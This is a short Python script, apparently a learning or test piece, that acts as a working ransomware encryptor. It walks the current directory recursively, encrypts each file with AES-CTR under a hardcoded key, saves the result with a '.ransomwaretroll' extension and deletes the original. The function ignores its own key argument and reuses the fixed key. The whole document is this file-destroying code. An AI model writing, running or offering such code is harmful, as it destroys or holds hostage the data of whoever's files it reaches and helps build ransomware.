import os
import pyaes



def encrypt_file(file_path, key):
    
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)
    
    crypto_data = aes.encrypt(file_data)
    new_file_path = file_path + ".ransomwaretroll"
    
    with open(new_file_path, 'wb') as new_file:
        new_file.write(crypto_data)
    os.remove(file_path)

directory_path = "."
key = b"testeransomwares"

for root, dirs, files in os.walk(directory_path):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path, key)
